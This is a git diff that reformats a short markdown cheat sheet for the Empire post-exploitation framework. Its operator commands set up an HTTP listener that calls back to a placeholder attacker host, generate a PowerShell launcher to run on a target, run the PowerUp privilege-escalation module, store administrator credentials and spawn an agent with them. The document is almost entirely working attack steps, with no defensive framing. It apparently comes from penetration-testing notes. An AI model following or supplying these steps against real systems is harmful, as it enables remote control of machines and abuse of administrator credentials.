@@ -1,51 +1,70 @@
 # Empire
+
 > Empire is a PowerShell and Python post-exploitation agent.  
 [GitHub - EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-- - - -
 ## Setup
-reset db
-`setup/reset.sh`
 
-setup listener
-`listeners`
-`uselistener http`
-`info`
-`set Host http://<ip>:<port>`
-`set Port <port>`
-`execute`
+Reset db
+```
+setup/reset.sh
+```
 
-- - - -
+Setup listener
+```
+listeners
+uselistener http
+info
+set Host http://<ip>:<port>
+set Port <port>
+execute
+```
+
 ## Generate shellcode
-`launcher powershell `
--> paste output into file and execute on target
 
-- - - -
+```
+launcher powershell
+```
+-> Paste output into file and execute on target
+
 ## Interact with agent
-`back`
-`back`
-`interact <agent-id>`
-`searchmodule PowerUp`
-`usemodule privesc/powerup/allcheck`
-`execute`
 
-store credentials
-`creds add <DefaultDomainName> administrator <pw>`
+```
+back
+back
+interact <agent-id>
+searchmodule PowerUp
+usemodule privesc/powerup/allcheck
+execute
+```
 
-`usemodule management/spawnas`
-`info`
-`set Domain <DefaultDomainName>`
+Store credentials
+```
+creds add <DefaultDomainName> administrator <pw>
+```
 
-`set UserName administrator`
-`set Password <pw>`
-or use stored creds
-`set CredID <creds-id>`
+```
+usemodule management/spawnas
+info
+set Domain <DefaultDomainName>
+```
 
-`set Listener http`
-`execute`
+```
+set UserName administrator
+set Password <pw>
+```
+Or use stored creds
+```
+set CredID <creds-id>
+```
 
-`back`
-`back`
-`agents`
+```
+set Listener http
+execute
+```
 
-- - - -
+```
+back
+back
+agents
+```
